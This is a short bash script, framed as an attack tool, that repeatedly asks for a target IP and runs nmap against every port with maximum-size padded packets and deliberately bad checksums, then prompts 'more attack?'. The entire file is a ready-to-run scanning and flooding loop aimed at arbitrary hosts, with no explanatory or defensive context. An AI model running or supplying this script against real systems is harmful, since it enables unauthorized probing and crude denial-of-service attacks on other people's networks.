#!/bin/bash

while true; do
    printf "[*] target IP : "
    read ip

    nmap "$ip" -p1-65535 --data-length 65434 --badsum

    printf "[*] more attack? [y/n]: "
    read choice

    if [ "$choice" != "y" ]; then
        break
    fi
done

